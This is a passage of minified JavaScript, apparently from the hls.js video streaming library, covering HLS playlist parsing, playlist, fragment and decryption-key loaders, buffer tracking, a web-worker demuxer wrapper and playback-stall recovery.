                                                    w = new gt(T),
                                                    A = w.enumeratedString("METHOD"),
                                                    R = w.URI,
                                                    P = w.hexadecimalInteger("IV"),
                                                    k = w.KEYFORMAT || "identity"; if ("com.apple.streamingkeydelivery" === k) { et.logger.warn("Keyformat com.apple.streamingkeydelivery is not supported"); continue }
                                                A && (o = new ot(t, R), R && ["AES-128", "SAMPLE-AES", "SAMPLE-AES-CENC"].indexOf(A) >= 0 && (o.method = A, o.key = null, o.iv = P)); break;
                                            case "START":
                                                var D = new gt(E),
                                                    L = D.decimalFloatingPoint("TIME-OFFSET");
                                                Object(Ze.isFiniteNumber)(L) && (c.startTimeOffset = L); break;
                                            case "MAP":
                                                var C = new gt(E);
                                                p.relurl = C.URI, C.BYTERANGE && p.setByteRange(C.BYTERANGE), p.baseurl = t, p.level = r, p.type = i, p.sn = "initSegment", c.initSegment = p, p = new ut, p.rawProgramDateTime = c.initSegment.rawProgramDateTime; break;
                                            default:
                                                et.logger.warn("line parsed but not handled: " + a) } } } return p = g, p && !p.relurl && (c.fragments.pop(), u -= p.duration), c.totalduration = u, c.averagetargetduration = u / c.fragments.length, c.endSN = l - 1, c.startCC = c.fragments[0] ? c.fragments[0].cc : 0, c.endCC = h, !c.initSegment && c.fragments.length && c.fragments.every(function(e) { return _t.test(e.relurl) }) && (et.logger.warn("MP4 fragments found but no init segment (probably no MAP, incomplete M3U8), trying to fetch SIDX"), p = new ut, p.relurl = c.fragments[0].relurl, p.baseurl = t, p.level = r, p.type = i, p.sn = "initSegment", c.initSegment = p, c.needSidxRanges = !0), v && d(c.fragments, v), c }, e }(),
                        St = window,
                        Tt = St.performance,
                        wt = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MANIFEST_LOADING, $e.default.LEVEL_LOADING, $e.default.AUDIO_TRACK_LOADING, $e.default.SUBTITLE_TRACK_LOADING) || this, r.loaders = {}, r }
                            h(t, e), t.canHaveQualityLevels = function(e) { return e !== Xe.AUDIO_TRACK && e !== Xe.SUBTITLE_TRACK }, t.mapContextToLevelType = function(e) { switch (e.type) {
                                    case Xe.AUDIO_TRACK:
                                        return nt.AUDIO;
                                    case Xe.SUBTITLE_TRACK:
                                        return nt.SUBTITLE;
                                    default:
                                        return nt.MAIN } }, t.getResponseUrl = function(e, t) { var r = e.url; return void 0 !== r && 0 !== r.indexOf("data:") || (r = t.url), r }; var r = t.prototype; return r.createInternalLoader = function(e) { var t = this.hls.config,
                                    r = t.pLoader,
                                    i = t.loader,
                                    n = r || i,
                                    a = new n(t); return e.loader = a, this.loaders[e.type] = a, a }, r.getInternalLoader = function(e) { return this.loaders[e.type] }, r.resetInternalLoader = function(e) { this.loaders[e] && delete this.loaders[e] }, r.destroyInternalLoaders = function() { for (var e in this.loaders) { var t = this.loaders[e];
                                    t && t.destroy(), this.resetInternalLoader(e) } }, r.destroy = function() { this.destroyInternalLoaders(), e.prototype.destroy.call(this) }, r.onManifestLoading = function(e) { this.load({ url: e.url, type: Xe.MANIFEST, level: 0, id: null, responseType: "text" }) }, r.onLevelLoading = function(e) { this.load({ url: e.url, type: Xe.LEVEL, level: e.level, id: e.id, responseType: "text" }) }, r.onAudioTrackLoading = function(e) { this.load({ url: e.url, type: Xe.AUDIO_TRACK, level: null, id: e.id, responseType: "text" }) }, r.onSubtitleTrackLoading = function(e) { this.load({ url: e.url, type: Xe.SUBTITLE_TRACK, level: null, id: e.id, responseType: "text" }) }, r.load = function(e) { var t = this.hls.config;
                                et.logger.debug("Loading playlist of type " + e.type + ", level: " + e.level + ", id: " + e.id); var r = this.getInternalLoader(e); if (r) { var i = r.context; if (i && i.url === e.url) return et.logger.trace("playlist request ongoing"), !1;
                                    et.logger.warn("aborting previous loader for type: " + e.type), r.abort() } var n, a, s, o; switch (e.type) {
                                    case Xe.MANIFEST:
                                        n = t.manifestLoadingMaxRetry, a = t.manifestLoadingTimeOut, s = t.manifestLoadingRetryDelay, o = t.manifestLoadingMaxRetryTimeout; break;
                                    case Xe.LEVEL:
                                        n = 0, o = 0, s = 0, a = t.levelLoadingTimeOut; break;
                                    default:
                                        n = t.levelLoadingMaxRetry, a = t.levelLoadingTimeOut, s = t.levelLoadingRetryDelay, o = t.levelLoadingMaxRetryTimeout }
                                r = this.createInternalLoader(e); var l = { timeout: a, maxRetry: n, retryDelay: s, maxRetryDelay: o },
                                    u = { onSuccess: this.loadsuccess.bind(this), onError: this.loaderror.bind(this), onTimeout: this.loadtimeout.bind(this) }; return et.logger.debug("Calling internal loader delegate for URL: " + e.url), r.load(e, l, u), !0 }, r.loadsuccess = function(e, t, r, i) { if (void 0 === i && (i = null), r.isSidxRequest) return this._handleSidxRequest(e, r), void this._handlePlaylistLoaded(e, t, r, i); if (this.resetInternalLoader(r.type), "string" != typeof e.data) throw new Error('expected responseType of "text" for PlaylistLoader'); var n = e.data; if (t.tload = Tt.now(), 0 !== n.indexOf("#EXTM3U")) return void this._handleManifestParsingError(e, r, "no EXTM3U delimiter", i);
                                n.indexOf("#EXTINF:") > 0 || n.indexOf("#EXT-X-TARGETDURATION:") > 0 ? this._handleTrackOrLevelPlaylist(e, t, r, i) : this._handleMasterPlaylist(e, t, r, i) }, r.loaderror = function(e, t, r) { void 0 === r && (r = null), this._handleNetworkError(t, r, !1, e) }, r.loadtimeout = function(e, t, r) { void 0 === r && (r = null), this._handleNetworkError(t, r, !0) }, r._handleMasterPlaylist = function(e, r, i, n) { var a = this.hls,
                                    s = e.data,
                                    o = t.getResponseUrl(e, i),
                                    l = Et.parseMasterPlaylist(s, o),
                                    u = l.levels,
                                    c = l.sessionData; if (!u.length) return void this._handleManifestParsingError(e, i, "no level found in manifest", n); var d = u.map(function(e) { return { id: e.attrs.AUDIO, codec: e.audioCodec } }),
                                    f = Et.parseMasterPlaylistMedia(s, o, "AUDIO", d),
                                    h = Et.parseMasterPlaylistMedia(s, o, "SUBTITLES"),
                                    g = Et.parseMasterPlaylistMedia(s, o, "CLOSED-CAPTIONS"); if (f.length) { var p = !1;
                                    f.forEach(function(e) { e.url || (p = !0) }), !1 === p && u[0].audioCodec && !u[0].attrs.AUDIO && (et.logger.log("audio codec signaled in quality level, but no embedded audio track signaled, create one"), f.unshift({ type: "main", name: "main", default: !1, autoselect: !1, forced: !1, id: -1, attrs: {}, url: "" })) }
                                a.trigger($e.default.MANIFEST_LOADED, { levels: u, audioTracks: f, subtitles: h, captions: g, url: o, stats: r, networkDetails: n, sessionData: c }) }, r._handleTrackOrLevelPlaylist = function(e, r, i, n) { var a = this.hls,
                                    s = i.id,
                                    o = i.level,
                                    l = i.type,
                                    u = t.getResponseUrl(e, i),
                                    c = Object(Ze.isFiniteNumber)(s) ? s : 0,
                                    d = Object(Ze.isFiniteNumber)(o) ? o : c,
                                    f = t.mapContextToLevelType(i),
                                    h = Et.parseLevelPlaylist(e.data, u, d, f, c); if (h.tload = r.tload, !h.fragments.length) return void a.trigger($e.default.ERROR, { type: Qe.ErrorTypes.NETWORK_ERROR, details: Qe.ErrorDetails.LEVEL_EMPTY_ERROR, fatal: !1, url: u, reason: "no fragments found in level", level: "number" == typeof i.level ? i.level : void 0 }); if (l === Xe.MANIFEST) { var g = { url: u, details: h };
                                    a.trigger($e.default.MANIFEST_LOADED, { levels: [g], audioTracks: [], url: u, stats: r, networkDetails: n, sessionData: null }) } if (r.tparsed = Tt.now(), h.needSidxRanges) { var p = h.initSegment.url; return void this.load({ url: p, isSidxRequest: !0, type: l, level: o, levelDetails: h, id: s, rangeStart: 0, rangeEnd: 2048, responseType: "arraybuffer" }) }
                                i.levelDetails = h, this._handlePlaylistLoaded(e, r, i, n) }, r._handleSidxRequest = function(e, t) { if ("string" == typeof e.data) throw new Error("sidx request must be made with responseType of array buffer"); var r = st.default.parseSegmentIndex(new Uint8Array(e.data)); if (r) { var i = r.references,
                                        n = t.levelDetails;
                                    i.forEach(function(e, t) { var r = e.info; if (n) { var i = n.fragments[t];
                                            0 === i.byteRange.length && i.setByteRange(String(1 + r.end - r.start) + "@" + String(r.start)) } }), n && n.initSegment.setByteRange(String(r.moovEndOffset) + "@0") } }, r._handleManifestParsingError = function(e, t, r, i) { this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.NETWORK_ERROR, details: Qe.ErrorDetails.MANIFEST_PARSING_ERROR, fatal: !0, url: e.url, reason: r, networkDetails: i }) }, r._handleNetworkError = function(e, t, r, i) { void 0 === r && (r = !1), void 0 === i && (i = null), et.logger.info("A network error occured while loading a " + e.type + "-type playlist"); var n, a, s = this.getInternalLoader(e); switch (e.type) {
                                    case Xe.MANIFEST:
                                        n = r ? Qe.ErrorDetails.MANIFEST_LOAD_TIMEOUT : Qe.ErrorDetails.MANIFEST_LOAD_ERROR, a = !0; break;
                                    case Xe.LEVEL:
                                        n = r ? Qe.ErrorDetails.LEVEL_LOAD_TIMEOUT : Qe.ErrorDetails.LEVEL_LOAD_ERROR, a = !1; break;
                                    case Xe.AUDIO_TRACK:
                                        n = r ? Qe.ErrorDetails.AUDIO_TRACK_LOAD_TIMEOUT : Qe.ErrorDetails.AUDIO_TRACK_LOAD_ERROR, a = !1; break;
                                    default:
                                        a = !1 }
                                s && (s.abort(), this.resetInternalLoader(e.type)); var o = { type: Qe.ErrorTypes.NETWORK_ERROR, details: n, fatal: a, url: e.url, loader: s, context: e, networkDetails: t };
                                i && (o.response = i), this.hls.trigger($e.default.ERROR, o) }, r._handlePlaylistLoaded = function(e, r, i, n) { var a = i.type,
                                    s = i.level,
                                    o = i.id,
                                    l = i.levelDetails; if (!l || !l.targetduration) return void this._handleManifestParsingError(e, i, "invalid target duration", n); if (t.canHaveQualityLevels(i.type)) this.hls.trigger($e.default.LEVEL_LOADED, { details: l, level: s || 0, id: o || 0, stats: r, networkDetails: n });
                                else switch (a) {
                                    case Xe.AUDIO_TRACK:
                                        this.hls.trigger($e.default.AUDIO_TRACK_LOADED, { details: l, id: o, stats: r, networkDetails: n }); break;
                                    case Xe.SUBTITLE_TRACK:
                                        this.hls.trigger($e.default.SUBTITLE_TRACK_LOADED, { details: l, id: o, stats: r, networkDetails: n }) } }, t }(it),
                        At = wt,
                        Rt = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.FRAG_LOADING) || this, r.loaders = {}, r }
                            g(t, e); var r = t.prototype; return r.destroy = function() { var t = this.loaders; for (var r in t) { var i = t[r];
                                    i && i.destroy() }
                                this.loaders = {}, e.prototype.destroy.call(this) }, r.onFragLoading = function(e) { var t = e.frag,
                                    r = t.type,
                                    i = this.loaders,
                                    n = this.hls.config,
                                    a = n.fLoader,
                                    s = n.loader;
                                t.loaded = 0; var o = i[r];
                                o && (et.logger.warn("abort previous fragment loader for type: " + r), o.abort()), o = i[r] = t.loader = n.fLoader ? new a(n) : new s(n); var l, u, c;
                                l = { url: t.url, frag: t, responseType: "arraybuffer", progressData: !1 }; var d = t.byteRangeStartOffset,
                                    f = t.byteRangeEndOffset;
                                Object(Ze.isFiniteNumber)(d) && Object(Ze.isFiniteNumber)(f) && (l.rangeStart = d, l.rangeEnd = f), u = { timeout: n.fragLoadingTimeOut, maxRetry: 0, retryDelay: 0, maxRetryDelay: n.fragLoadingMaxRetryTimeout }, c = { onSuccess: this.loadsuccess.bind(this), onError: this.loaderror.bind(this), onTimeout: this.loadtimeout.bind(this), onProgress: this.loadprogress.bind(this) }, o.load(l, u, c) }, r.loadsuccess = function(e, t, r, i) { void 0 === i && (i = null); var n = e.data,
                                    a = r.frag;
                                a.loader = void 0, this.loaders[a.type] = void 0, this.hls.trigger($e.default.FRAG_LOADED, { payload: n, frag: a, stats: t, networkDetails: i }) }, r.loaderror = function(e, t, r) { void 0 === r && (r = null); var i = t.frag,
                                    n = i.loader;
                                n && n.abort(), this.loaders[i.type] = void 0, this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.NETWORK_ERROR, details: Qe.ErrorDetails.FRAG_LOAD_ERROR, fatal: !1, frag: t.frag, response: e, networkDetails: r }) }, r.loadtimeout = function(e, t, r) { void 0 === r && (r = null); var i = t.frag,
                                    n = i.loader;
                                n && n.abort(), this.loaders[i.type] = void 0, this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.NETWORK_ERROR, details: Qe.ErrorDetails.FRAG_LOAD_TIMEOUT, fatal: !1, frag: t.frag, networkDetails: r }) }, r.loadprogress = function(e, t, r, i) { void 0 === i && (i = null); var n = t.frag;
                                n.loaded = e.loaded, this.hls.trigger($e.default.FRAG_LOAD_PROGRESS, { frag: n, stats: e, networkDetails: i }) }, t }(it),
                        Pt = Rt,
                        kt = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.KEY_LOADING) || this, r.loaders = {}, r.decryptkey = null, r.decrypturl = null, r }
                            p(t, e); var r = t.prototype; return r.destroy = function() { for (var t in this.loaders) { var r = this.loaders[t];
                                    r && r.destroy() }
                                this.loaders = {}, e.prototype.destroy.call(this) }, r.onKeyLoading = function(e) { var t = e.frag,
                                    r = t.type,
                                    i = this.loaders[r]; if (!t.decryptdata) return void et.logger.warn("Missing decryption data on fragment in onKeyLoading"); var n = t.decryptdata.uri; if (n !== this.decrypturl || null === this.decryptkey) { var a = this.hls.config; if (i && (et.logger.warn("abort previous key loader for type:" + r), i.abort()), !n) return void et.logger.warn("key uri is falsy");
                                    t.loader = this.loaders[r] = new a.loader(a), this.decrypturl = n, this.decryptkey = null; var s = { url: n, frag: t, responseType: "arraybuffer" },
                                        o = { timeout: a.fragLoadingTimeOut, maxRetry: 0, retryDelay: a.fragLoadingRetryDelay, maxRetryDelay: a.fragLoadingMaxRetryTimeout },
                                        l = { onSuccess: this.loadsuccess.bind(this), onError: this.loaderror.bind(this), onTimeout: this.loadtimeout.bind(this) };
                                    t.loader.load(s, o, l) } else this.decryptkey && (t.decryptdata.key = this.decryptkey, this.hls.trigger($e.default.KEY_LOADED, { frag: t })) }, r.loadsuccess = function(e, t, r) { var i = r.frag; if (!i.decryptdata) return void et.logger.error("after key load, decryptdata unset");
                                this.decryptkey = i.decryptdata.key = new Uint8Array(e.data), i.loader = void 0, delete this.loaders[i.type], this.hls.trigger($e.default.KEY_LOADED, { frag: i }) }, r.loaderror = function(e, t) { var r = t.frag,
                                    i = r.loader;
                                i && i.abort(), delete this.loaders[r.type], this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.NETWORK_ERROR, details: Qe.ErrorDetails.KEY_LOAD_ERROR, fatal: !1, frag: r, response: e }) }, r.loadtimeout = function(e, t) { var r = t.frag,
                                    i = r.loader;
                                i && i.abort(), delete this.loaders[r.type], this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.NETWORK_ERROR, details: Qe.ErrorDetails.KEY_LOAD_TIMEOUT, fatal: !1, frag: r }) }, t }(it),
                        Dt = kt,
                        Lt = { NOT_LOADED: "NOT_LOADED", APPENDING: "APPENDING", PARTIAL: "PARTIAL", OK: "OK" },
                        Ct = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.BUFFER_APPENDED, $e.default.FRAG_BUFFERED, $e.default.FRAG_LOADED) || this, r.bufferPadding = .2, r.fragments = Object.create(null), r.timeRanges = Object.create(null), r.config = t.config, r }
                            v(t, e); var r = t.prototype; return r.destroy = function() { this.fragments = Object.create(null), this.timeRanges = Object.create(null), this.config = null, it.prototype.destroy.call(this), e.prototype.destroy.call(this) }, r.getBufferedFrag = function(e, t) { var r = this.fragments,
                                    i = Object.keys(r).filter(function(i) { var n = r[i]; if (n.body.type !== t) return !1; if (!n.buffered) return !1; var a = n.body; return a.startPTS <= e && e <= a.endPTS }); if (0 === i.length) return null; var n = i.pop(); return r[n].body }, r.detectEvictedFragments = function(e, t) { var r = this;
                                Object.keys(this.fragments).forEach(function(i) { var n = r.fragments[i]; if (n && n.buffered) { var a = n.range[e]; if (a)
                                            for (var s = a.time, o = 0; o < s.length; o++) { var l = s[o]; if (!r.isTimeBuffered(l.startPTS, l.endPTS, t)) { r.removeFragment(n.body); break } } } }) }, r.detectPartialFragments = function(e) { var t = this,
                                    r = this.getFragmentKey(e),
                                    i = this.fragments[r];
                                i && (i.buffered = !0, Object.keys(this.timeRanges).forEach(function(r) { if (e.hasElementaryStream(r)) { var n = t.timeRanges[r];
                                        i.range[r] = t.getBufferedTimes(e.startPTS, e.endPTS, n) } })) }, r.getBufferedTimes = function(e, t, r) { for (var i, n, a = [], s = !1, o = 0; o < r.length; o++) { if (i = r.start(o) - this.bufferPadding, n = r.end(o) + this.bufferPadding, e >= i && t <= n) { a.push({ startPTS: Math.max(e, r.start(o)), endPTS: Math.min(t, r.end(o)) }); break } if (e < n && t > i) a.push({ startPTS: Math.max(e, r.start(o)), endPTS: Math.min(t, r.end(o)) }), s = !0;
                                    else if (t <= i) break } return { time: a, partial: s } }, r.getFragmentKey = function(e) { return e.type + "_" + e.level + "_" + e.urlId + "_" + e.sn }, r.getPartialFragment = function(e) { var t, r, i, n = this,
                                    a = null,
                                    s = 0; return Object.keys(this.fragments).forEach(function(o) { var l = n.fragments[o];
                                    n.isPartial(l) && (r = l.body.startPTS - n.bufferPadding, i = l.body.endPTS + n.bufferPadding, e >= r && e <= i && (t = Math.min(e - r, i - e), s <= t && (a = l.body, s = t))) }), a }, r.getState = function(e) { var t = this.getFragmentKey(e),
                                    r = this.fragments[t],
                                    i = Lt.NOT_LOADED; return void 0 !== r && (i = r.buffered ? !0 === this.isPartial(r) ? Lt.PARTIAL : Lt.OK : Lt.APPENDING), i }, r.isPartial = function(e) { return !0 === e.buffered && (void 0 !== e.range.video && !0 === e.range.video.partial || void 0 !== e.range.audio && !0 === e.range.audio.partial) }, r.isTimeBuffered = function(e, t, r) { for (var i, n, a = 0; a < r.length; a++) { if (i = r.start(a) - this.bufferPadding, n = r.end(a) + this.bufferPadding, e >= i && t <= n) return !0; if (t <= i) return !1 } return !1 }, r.onFragLoaded = function(e) { var t = e.frag;
                                Object(Ze.isFiniteNumber)(t.sn) && !t.bitrateTest && (this.fragments[this.getFragmentKey(t)] = { body: t, range: Object.create(null), buffered: !1 }) }, r.onBufferAppended = function(e) { var t = this;
                                this.timeRanges = e.timeRanges, Object.keys(this.timeRanges).forEach(function(e) { var r = t.timeRanges[e];
                                    t.detectEvictedFragments(e, r) }) }, r.onFragBuffered = function(e) { this.detectPartialFragments(e.frag) }, r.hasFragment = function(e) { var t = this.getFragmentKey(e); return void 0 !== this.fragments[t] }, r.removeFragment = function(e) { var t = this.getFragmentKey(e);
                                delete this.fragments[t] }, r.removeAllFragments = function() { this.fragments = Object.create(null) }, t }(it),
                        It = { search: function(e, t) { for (var r = 0, i = e.length - 1, n = null, a = null; r <= i;) { n = (r + i) / 2 | 0, a = e[n]; var s = t(a); if (s > 0) r = n + 1;
                                    else { if (!(s < 0)) return a;
                                        i = n - 1 } } return null } },
                        Ot = It,
                        Mt = function() {
                            function e() {} return e.isBuffered = function(e, t) { try { if (e)
                                        for (var r = e.buffered, i = 0; i < r.length; i++)
                                            if (t >= r.start(i) && t <= r.end(i)) return !0 } catch (e) {} return !1 }, e.bufferInfo = function(e, t, r) { try { if (e) { var i, n = e.buffered,
                                            a = []; for (i = 0; i < n.length; i++) a.push({ start: n.start(i), end: n.end(i) }); return this.bufferedInfo(a, t, r) } } catch (e) {} return { len: 0, start: t, end: t, nextStart: void 0 } }, e.bufferedInfo = function(e, t, r) { e.sort(function(e, t) { var r = e.start - t.start; return r || t.end - e.end }); var i = []; if (r)
                                    for (var n = 0; n < e.length; n++) { var a = i.length; if (a) { var s = i[a - 1].end;
                                            e[n].start - s < r ? e[n].end > s && (i[a - 1].end = e[n].end) : i.push(e[n]) } else i.push(e[n]) } else i = e; for (var o, l = 0, u = t, c = t, d = 0; d < i.length; d++) { var f = i[d].start,
                                        h = i[d].end; if (t + r >= f && t < h) u = f, c = h, l = c - t;
                                    else if (t + r < f) { o = f; break } } return { len: l, start: u, end: c, nextStart: o } }, e }(),
                        xt = r("./node_modules/eventemitter3/index.js"),
                        Nt = r("./node_modules/webworkify-webpack/index.js"),
                        Ft = r("./src/demux/demuxer-inline.js"),
                        Bt = r("./src/utils/get-self-scope.js"),
                        Ut = function(e) {
                            function t() { return e.apply(this, arguments) || this } return y(t, e), t.prototype.trigger = function(e) { for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), i = 1; i < t; i++) r[i - 1] = arguments[i];
                                this.emit.apply(this, [e, e].concat(r)) }, t }(xt.EventEmitter),
                        jt = Object(Bt.getSelfScope)(),
                        Gt = m() || { isTypeSupported: function() { return !1 } },
                        Kt = function() {
                            function e(e, t) { var r = this;
                                this.hls = e, this.id = t; var i = this.observer = new Ut,
                                    n = e.config,
                                    a = function(t, i) { i = i || {}, i.frag = r.frag, i.id = r.id, e.trigger(t, i) };
                                i.on($e.default.FRAG_DECRYPTED, a), i.on($e.default.FRAG_PARSING_INIT_SEGMENT, a), i.on($e.default.FRAG_PARSING_DATA, a), i.on($e.default.FRAG_PARSED, a), i.on($e.default.ERROR, a), i.on($e.default.FRAG_PARSING_METADATA, a), i.on($e.default.FRAG_PARSING_USERDATA, a), i.on($e.default.INIT_PTS_FOUND, a); var s = { mp4: Gt.isTypeSupported("video/mp4"), mpeg: Gt.isTypeSupported("audio/mpeg"), mp3: Gt.isTypeSupported('audio/mp4; codecs="mp3"') },
                                    o = navigator.vendor; if (n.enableWorker && "undefined" != typeof Worker) { et.logger.log("demuxing in webworker"); var l; try { l = this.w = Nt("./src/demux/demuxer-worker.js"), this.onwmsg = this.onWorkerMessage.bind(this), l.addEventListener("message", this.onwmsg), l.onerror = function(t) { e.trigger($e.default.ERROR, { type: Qe.ErrorTypes.OTHER_ERROR, details: Qe.ErrorDetails.INTERNAL_EXCEPTION, fatal: !0, event: "demuxerWorker", err: { message: t.message + " (" + t.filename + ":" + t.lineno + ")" } }) }, l.postMessage({ cmd: "init", typeSupported: s, vendor: o, id: t, config: JSON.stringify(n) }) } catch (e) { et.logger.warn("Error in worker:", e), et.logger.error("Error while initializing DemuxerWorker, fallback on DemuxerInline"), l && jt.URL.revokeObjectURL(l.objectURL), this.demuxer = new Ft.default(i, s, n, o), this.w = void 0 } } else this.demuxer = new Ft.default(i, s, n, o) } var t = e.prototype; return t.destroy = function() { var e = this.w; if (e) e.removeEventListener("message", this.onwmsg), e.terminate(), this.w = null;
                                else { var t = this.demuxer;
                                    t && (t.destroy(), this.demuxer = null) } var r = this.observer;
                                r && (r.removeAllListeners(), this.observer = null) }, t.push = function(e, t, r, i, n, a, s, o) { var l = this.w,
                                    u = Object(Ze.isFiniteNumber)(n.startPTS) ? n.startPTS : n.start,
                                    c = n.decryptdata,
                                    d = this.frag,
                                    f = !(d && n.cc === d.cc),
                                    h = !(d && n.level === d.level),
                                    g = d && n.sn === d.sn + 1,
                                    p = !h && g; if (f && et.logger.log(this.id + ":discontinuity detected"), h && et.logger.log(this.id + ":switch detected"), this.frag = n, l) l.postMessage({ cmd: "demux", data: e, decryptdata: c, initSegment: t, audioCodec: r, videoCodec: i, timeOffset: u, discontinuity: f, trackSwitch: h, contiguous: p, duration: a, accurateTimeOffset: s, defaultInitPTS: o }, e instanceof ArrayBuffer ? [e] : []);
                                else { var v = this.demuxer;
                                    v && v.push(e, c, t, r, i, u, f, h, p, a, s, o) } }, t.onWorkerMessage = function(e) { var t = e.data,
                                    r = this.hls; switch (t.event) {
                                    case "init":
                                        jt.URL.revokeObjectURL(this.w.objectURL); break;
                                    case $e.default.FRAG_PARSING_DATA:
                                        t.data.data1 = new Uint8Array(t.data1), t.data2 && (t.data.data2 = new Uint8Array(t.data2));
                                    default:
                                        t.data = t.data || {}, t.data.frag = this.frag, t.data.id = this.id, r.trigger(t.event, t.data) } }, e }(),
                        qt = Kt,
                        Ht = { toString: function(e) { for (var t = "", r = e.length, i = 0; i < r; i++) t += "[" + e.start(i).toFixed(3) + "," + e.end(i).toFixed(3) + "]"; return t } },
                        Vt = Ht,
                        Wt = function() {
                            function e(e, t, r, i) { this.config = e, this.media = t, this.fragmentTracker = r, this.hls = i, this.nudgeRetry = 0, this.stallReported = !1, this.stalled = null, this.moved = !1, this.seeking = !1 } var t = e.prototype; return t.poll = function(e) { var t = this.config,
                                    r = this.media,
                                    i = this.stalled,
                                    n = r.currentTime,
                                    a = r.seeking,
                                    s = this.seeking && !a,
                                    o = !this.seeking && a; if (this.seeking = a, n === e) { if ((o || s) && (this.stalled = null), !r.paused && !r.ended && 0 !== r.playbackRate && r.buffered.length) { var l = Mt.bufferInfo(r, n, 0),
                                            u = l.len > 0,
                                            c = l.nextStart || 0; if (u || c) { if (a) { var d = l.len > 2,
                                                    f = !c || c - n > 2 && !this.fragmentTracker.getPartialFragment(n); if (d || f) return;
                                                this.moved = !1 } if (!this.moved && this.stalled) { var h = Math.max(c, l.start || 0) - n; if (h > 0 && h <= 2) return void this._trySkipBufferHole(null) } var g = self.performance.now(); if (null === i) return void(this.stalled = g); var p = g - i;!a && p >= 250 && this._reportStall(l.len); var v = Mt.bufferInfo(r, n, t.maxBufferHole);
                                            this._tryFixBufferStall(v, p) } } } else if (this.moved = !0, null !== i) { if (this.stallReported) { var m = self.performance.now() - i;
                                        et.logger.warn("playback not stuck anymore @" + n + ", after " + Math.round(m) + "ms"), this.stallReported = !1 }
                                    this.stalled = null, this.nudgeRetry = 0 } }, t._tryFixBufferStall = function(e, t) { var r = this.config,
                                    i = this.fragmentTracker,
                                    n = this.media,
                                    a = n.currentTime,
                                    s = i.getPartialFragment(a); if (s) { if (this._trySkipBufferHole(s)) return }
                                e.len > r.maxBufferHole && t > 1e3 * r.highBufferWatchdogPeriod && (et.logger.warn("Trying to nudge playhead over buffer-hole"), this.stalled = null, this._tryNudgeBuffer()) }, t._reportStall = function(e) { var t = this.hls,
                                    r = this.media;
                                this.stallReported || (this.stallReported = !0, et.logger.warn("Playback stalling at @" + r.currentTime + " due to low buffer (buffer=" + e + ")"), t.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.BUFFER_STALLED_ERROR, fatal: !1, buffer: e })) }, t._trySkipBufferHole = function(e) { for (var t = this.config, r = this.hls, i = this.media, n = i.currentTime, a = 0, s = 0; s < i.buffered.length; s++) { var o = i.buffered.start(s); if (n + t.maxBufferHole >= a && n < o) { var l = Math.max(o + .05, i.currentTime + .1); return et.logger.warn("skipping hole, adjusting currentTime from " + n + " to " + l), this.moved = !0, this.stalled = null, i.currentTime = l, e && r.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.BUFFER_SEEK_OVER_HOLE, fatal: !1, reason: "fragment loaded with buffer holes, seeking from " + n + " to " + l, frag: e }), l }
                                    a = i.buffered.end(s) } return 0 }, t._tryNudgeBuffer = function() { var e = this.config,
                                    t = this.hls,
                                    r = this.media,
                                    i = r.currentTime,
                                    n = (this.nudgeRetry || 0) + 1; if (this.nudgeRetry = n, n < e.nudgeMaxRetry) { var a = i + n * e.nudgeOffset;
                                    et.logger.warn("Nudging 'currentTime' from " + i + " to " + a), r.currentTime = a, t.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.BUFFER_NUDGE_ON_STALL, fatal: !1 }) } else et.logger.error("Playhead still not moving while enough data buffered @" + i + " after " + e.nudgeMaxRetry + " nudges"), t.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.BUFFER_STALLED_ERROR, fatal: !0 }) }, e }(),
                        zt = function(e) {
                            function t(t) { for (var r, i = arguments.length, n = new Array(i > 1 ? i - 1 : 0), a = 1; a < i; a++) n[a - 1] = arguments[a]; return r = e.call.apply(e, [this, t].concat(n)) || this, r._boundTick = void 0, r._tickTimer = null, r._tickInterval = null, r._tickCallCount = 0, r._boundTick = r.tick.bind(U(r)), r }
                            j(t, e); var r = t.prototype; return r.onHandlerDestroying = function() { this.clearNextTick(), this.clearInterval() }, r.hasInterval = function() { return !!this._tickInterval }, r.hasNextTick = function() { return !!this._tickTimer }, r.setInterval = function(e) { return !this._tickInterval && (this._tickInterval = self.setInterval(this._boundTick, e), !0) }, r.clearInterval = function() { return !!this._tickInterval && (self.clearInterval(this._tickInterval), this._tickInterval = null, !0) }, r.clearNextTick = function() { return !!this._tickTimer && (self.clearTimeout(this._tickTimer), this._tickTimer = null, !0) }, r.tick = function() { 1 === ++this._tickCallCount && (this.doTick(), this._tickCallCount > 1 && (this.clearNextTick(), this._tickTimer = self.setTimeout(this._boundTick, 0)), this._tickCallCount = 0) }, r.doTick = function() {}, t }(it),
                        Yt = { STOPPED: "STOPPED", STARTING: "STARTING", IDLE: "IDLE", PAUSED: "PAUSED", KEY_LOADING: "KEY_LOADING", FRAG_LOADING: "FRAG_LOADING", FRAG_LOADING_WAITING_RETRY: "FRAG_LOADING_WAITING_RETRY", WAITING_TRACK: "WAITING_TRACK", PARSING: "PARSING", PARSED: "PARSED", BUFFER_FLUSHING: "BUFFER_FLUSHING", ENDED: "ENDED", ERROR: "ERROR", WAITING_INIT_PTS: "WAITING_INIT_PTS", WAITING_LEVEL: "WAITING_LEVEL" },
                        Xt = function(e) {
                            function t() { return e.apply(this, arguments) || this }
                            G(t, e); var r = t.prototype; return r.doTick = function() {}, r.startLoad = function() {}, r.stopLoad = function() { var e = this.fragCurrent;
                                e && (e.loader && e.loader.abort(), this.fragmentTracker.removeFragment(e)), this.demuxer && (this.demuxer.destroy(), this.demuxer = null), this.fragCurrent = null, this.fragPrevious = null, this.clearInterval(), this.clearNextTick(), this.state = Yt.STOPPED }, r._streamEnded = function(e, t) { var r = this.fragCurrent,
